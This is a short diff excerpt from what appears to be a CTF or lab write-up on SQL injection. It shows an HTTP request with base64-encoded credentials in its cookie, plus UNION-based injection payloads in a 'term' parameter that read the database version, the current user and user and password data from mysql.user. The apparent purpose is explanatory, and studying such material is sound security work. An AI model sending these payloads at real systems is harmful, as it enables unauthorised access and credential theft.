@@ -88,11 +88,8 @@ Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
 Connection: close
 
 term=1'union+select+1,@@version,3-- -
-```
 
-```
-term=1'union+select+1,user()+from+mysql.user,3-- -
-user: `root@localhost`
+this returns user: `root@localhost`
 
 lucky guess:
 term=1'union slect user,password,3 from mysql.user--
